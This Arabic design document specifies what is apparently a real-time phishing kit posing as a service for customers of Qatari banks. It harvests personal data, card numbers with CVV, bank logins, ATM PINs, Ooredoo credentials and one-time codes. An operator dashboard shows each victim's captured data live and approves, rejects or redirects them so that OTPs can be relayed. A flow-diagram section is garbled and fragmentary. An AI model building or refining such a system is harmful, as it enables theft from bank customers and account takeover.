# Qatar Tayrn - تدفق العمل الكامل

## نظرة عامة على النظام

هذا المستند يوضح تدفق العمل الكامل لموقع Qatar Tayrn، بما في ذلك جميع الخطوات والتفاعلات بين العميل ولوحة التحكم الإدارية.

---

## 1. تدفق العميل (Customer Flow)

### الخطوة 1: اختيار البنك والبيانات الشخصية
- العميل يدخل الموقع ويختار البنك (QNB, QIB, Rayan, Doha)
- يتم إنشاء `sessionId` وحفظه في `localStorage`
- العميل يملأ البيانات الشخصية (الاسم، الهوية، الهاتف، البريد الإلكتروني، تاريخ الميلاد، الجنس)
- ينتقل إلى صفحة تسجيل الدخول

### الخطوة 2: تسجيل الدخول (Login Method)
العميل يختار طريقة تسجيل الدخول:

**أ) تسجيل الدخول بالبطاقة:**
- رقم البطاقة
- اسم صاحب البطاقة
- تاريخ الانتهاء
- CVV

**ب) تسجيل الدخول باسم المستخدم وكلمة المرور:**
- اسم المستخدم
- كلمة المرور

**بعد الإرسال:**
- يتم حفظ البيانات في قاعدة البيانات
- يتم تحديث حالة الجلسة إلى `loading` مع `currentStep = "login"`
- العميل ينتقل إلى صفحة التحميل (Waiting Page)

### الخطوة 3: صفحة التحميل (Waiting Page)
- تعرض رسالة "جاري التحميل..."
- تقوم بـ polling كل ثانيتين للتحقق من قرار Admin

**السيناريوهات الممكنة:**
1. **القبول (Approve):** ينتقل إلى صفحة OTP الأولى
2. **الرفض (Reject):** يعود إلى صفحة تسجيل الدخول مع رسالة خطأ
3. **إعادة التوجيه (Redirect):** ينتقل إلى الصفحة المحددة من Admin

### الخطوة 4: OTP الأول (First OTP)
- العميل يدخل رمز التحقق المكون من 6 أرقام
- يتم حفظ الرمز في قاعدة البيانات مع `otpType = "standard"`
- يتم تحديث حالة الجلسة إلى `loading` مع `currentStep = "otp"`
- ينتقل إلى صفحة التحميل

### الخطوة 5: رقم السري للـ ATM (ATM PIN)
- العميل يدخل رقم سري مكون من 4 أرقام
- يتم حفظ الرقم في قاعدة البيانات
- يتم تحديث حالة الجلسة إلى `loading` مع `currentStep = "atm"`
- ينتقل إلى صفحة التحميل

### الخطوة 6: تسجيل الدخول إلى Ooredoo
- العميل يدخل اسم مستخدم Ooredoo وكلمة المرور
- يتم حفظ البيانات في قاعدة البيانات
- يتم تحديث حالة الجلسة إلى `loading` مع `currentStep = "ooredoo"`
- ينتقل إلى صفحة التحميل

### الخطوة 7: OTP Ooredoo (Second OTP)
- العميل يدخل رمز التحقق المكون من 6 أرقام
- يتم حفظ الرمز في قاعدة البيانات مع `otpType = "ooredoo"`
- يتم تحديث حالة الجلسة إلى `loading` مع `currentStep = "otp_ooredoo"`
- ينتقل إلى صفحة التحميل

### الخطوة 8: صفحة النجاح (Success Page)
- بعد الموافقة على OTP Ooredoo، يظهر للعميل صفحة النجاح
- تعرض رسالة تأكيد بنجاح العملية

## 2. رسائل الخطأ

عند رفض Admin للطلب في أي مرحلة، يتم عرض رسالة خطأ محددة:

| المرحلة | رسالة الخطأ (العربية) | رسالة الخطأ (الإنجليزية) |
|--------|-------------------|----------------------|
| تسجيل الدخول | رجاء التأكد من المعلومات الصحيحة وإعادة المحاولة | Please verify the correct information and try again |
| OTP الأول | رجاء التحقق من الرمز المرسل عبر الجوال الصحيح | Please verify the correct code sent via mobile |
| ATM PIN | رجاء التحقق من رقم السري للصرف الآلي الصحيح | Please verify the correct ATM PIN |
| Ooredoo | اسم المستخدم أو كلمة المرور غير صحيحة | Username or password is incorrect |
| OTP Ooredoo | رجاء التحقق من الرمز الصحيح المرسل عبر الجوال | Please verify the correct code sent via mobile |

## 3. لوحة التحكم الإدارية (Admin Dashboard)

### 3.1 تسجيل الدخول
- كلمة المرور الافتراضية: `admin123`
- الوصول إلى: `/admin`

### 3.2 واجهة لوحة التحكم

#### أ) عدادات الزيارات
تعرض ثلاثة عدادات في الأعلى:
- **الزيارات الحالية:** إجمالي عدد الجلسات النشطة
- **في الانتظار:** عدد الجلسات التي تنتظر قرار Admin
- **موافق عليها:** عدد الجلسات التي تمت الموافقة عليها

#### ب) جدول البيانات
يعرض الأعمدة التالية بالترتيب:

| العمود | الوصف |
|-------|-------|
| الدولة | مصدر الزيارة (عادة Qatar) |
| البنك | اسم البنك المختار (QNB, QIB, Rayan, Doha) |
| الاسم | اسم العميل بالعربية |
| الهاتف | رقم هاتف العميل |
| الهوية | رقم هوية العميل |
| الحالة | الصفحة الحالية للعميل |
| الإجراءات | الأزرار المتاحة |

#### ج) حالات الصفحات (Status Colors)
كل صفحة لها لون مختلف للتمييز السريع:

| الصفحة | اللون | الوصف |
|-------|-------|-------|
| تسجيل الدخول | أزرق | صفحة تسجيل الدخول |
| OTP الأول | بنفسجي | صفحة OTP الأولى |
| ATM PIN | برتقالي | صفحة رقم السري للـ ATM |
| Ooredoo | أحمر | صفحة Ooredoo |
| OTP Ooredoo | وردي | صفحة OTP Ooredoo |

### 3.3 الإجراءات المتاحة

#### أ) زر التفاصيل (Details)
- يفتح نافذة منبثقة تعرض جميع بيانات العميل:
  - البيانات الشخصية (الاسم، الهوية، الهاتف، تاريخ الميلاد، الجنس)
  - طريقة تسجيل الدخول (بيانات البطاقة أو اسم المستخدم)
  - رقم السري للـ ATM
  - رموز OTP
  - بيانات Ooredoo

#### ب) زر إعادة التوجيه (Redirect)
- يفتح قائمة منبثقة بجميع صفحات الموقع
- يمكن توجيه العميل إلى أي صفحة:
  - صفحة تسجيل الدخول
  - صفحة OTP الأولى
  - صفحة ATM PIN
  - صفحة Ooredoo
  - صفحة OTP Ooredoo
  - صفحة النجاح

#### ج) أزرار القبول والرفض
تظهر فقط عندما تكون حالة الجلسة `loading`:

- **زر القبول (✓):** 
  - يوافق على الطلب الحالي
  - ينقل العميل إلى الصفحة التالية تلقائياً

- **زر الرفض (✗):**
  - يرفض الطلب الحالي
  - يعيد العميل إلى الصفحة السابقة مع رسالة خطأ

### 3.4 البحث والتصفية
- يمكن البحث عن الجلسات بـ:
  - معرف الجلسة (Session ID)
  - اسم البنك
  - اسم العميل
  - رقم الهاتف

## 4. قاعدة البيانات

### جداول البيانات الرئيسية

#### جدول sessions
```sql
CREATE TABLE "sessions" (
  "id" varchar(64) PRIMARY KEY,
  "selectedBank" varchar(50) NOT NULL,
  "country" varchar(100) DEFAULT 'Qatar',
  "status" varchar(20) DEFAULT 'pending',
  "currentStep" varchar(50),
  "adminAction" varchar(20),
  "redirectTarget" varchar(50),
  "errorMessage" text,
  "createdAt" timestamp DEFAULT now(),
  "updatedAt" timestamp DEFAULT now()
);
```

#### جدول personalDataSubmissions
يحتفظ بالبيانات الشخصية للعميل

#### جدول loginMethodSubmissions
يحتفظ ببيانات تسجيل الدخول (بطاقة أو اسم مستخدم)

#### جدول atmPinSubmissions
يحتفظ برقم السري للـ ATM

#### جدول otpSubmissions
يحتفظ برموز OTP (النوع: standard أو ooredoo)

#### جدول ooredooSubmissions
يحتفظ ببيانات Ooredoo

## 5. API Endpoints

### الإرسال والاستعلام

#### `submissions.submitLoginMethod`
- **الوصف:** إرسال بيانات تسجيل الدخول
- **الحالة المتوقعة:** `loading` مع `currentStep = "login"`

#### `submissions.submitOtp`
- **الوصف:** إرسال رمز OTP
- **الحالة المتوقعة:** `loading` مع `currentStep = "otp"` أو `"otp_ooredoo"`

#### `submissions.submitAtmPin`
- **الوصف:** إرسال رقم السري للـ ATM
- **الحالة المتوقعة:** `loading` مع `currentStep = "atm"`

#### `submissions.submitOoredoo`
- **الوصف:** إرسال بيانات Ooredoo
- **الحالة المتوقعة:** `loading` مع `currentStep = "ooredoo"`

### إجراءات Admin

#### `submissions.adminTakeAction`
- **الوصف:** الموافقة أو الرفض
- **المدخلات:**
  - `sessionId`: معرف الجلسة
  - `action`: "approve" أو "reject"
  - `errorMessage`: رسالة الخطأ (في حالة الرفض)

#### `submissions.adminRedirect`
- **الوصف:** توجيه العميل إلى صفحة محددة
- **المدخلات:**
  - `sessionId`: معرف الجلسة
  - `targetPage`: اسم الصفحة المستهدفة

  - رفض → رجوع مع رسالة خطأ

    ↓

    ↓
إرسال الرقم → حالة: loading, currentStep: atm

  - قبول → Ooredoo

    ↓

    ↓

## 7. ملاحظات مهمة

### الأمان
- جميع البيانات الحساسة (بيانات البطاقة، كلمات المرور) يتم حفظها في قاعدة البيانات
- يجب استخدام HTTPS في الإنتاج
- كلمة مرور Admin يجب تغييرها من `admin123` في الإنتاج

### الأداء
- صفحة التحميل تقوم بـ polling كل ثانيتين
- يمكن تحسين الأداء باستخدام WebSockets بدلاً من polling

### التوسع المستقبلي
- إضافة نظام تنبيهات للـ Admin
- إضافة تقارير وإحصائيات
- إضافة نظام تسجيل الأحداث (Logging)
- إضافة نظام الأدوار والصلاحيات

---

## 8. استكشاف الأخطاء

### العميل عالق في صفحة التحميل
- تحقق من أن Admin قد اتخذ قرار
- تأكد من أن معرف الجلسة صحيح
- تحقق من اتصال الإنترنت

### لا تظهر البيانات في لوحة Admin
- تأكد من أن قاعدة البيانات متصلة
- تحقق من أن البيانات تم إرسالها بنجاح
- حاول تحديث الصفحة

### رسائل الخطأ لا تظهر
- تحقق من أن ملف الترجمات محدث
- تأكد من أن اللغة محددة بشكل صحيح
